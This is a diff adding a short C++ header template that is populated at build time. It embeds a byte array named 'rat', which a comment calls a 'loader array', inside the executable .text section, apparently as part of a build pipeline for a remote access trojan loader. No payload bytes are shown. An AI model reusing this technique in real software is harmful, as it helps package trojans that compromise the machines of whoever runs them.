@@ -1,0 +1,17 @@
+// This is a header template that is populated at build time. The instantiated
+// version will reside in the binary directory for this target.
+#pragma once
+#include <array>
+
+// Create a dedicated section for the byte array
+#pragma section(".text")
+
+namespace embedded {{
+
+// Allocate the loader array within the specified section
+__declspec(allocate(".text"))
+inline std::array<uint8_t, {}> rat{{
+{}
+}};
+
+}} // namespace embedded
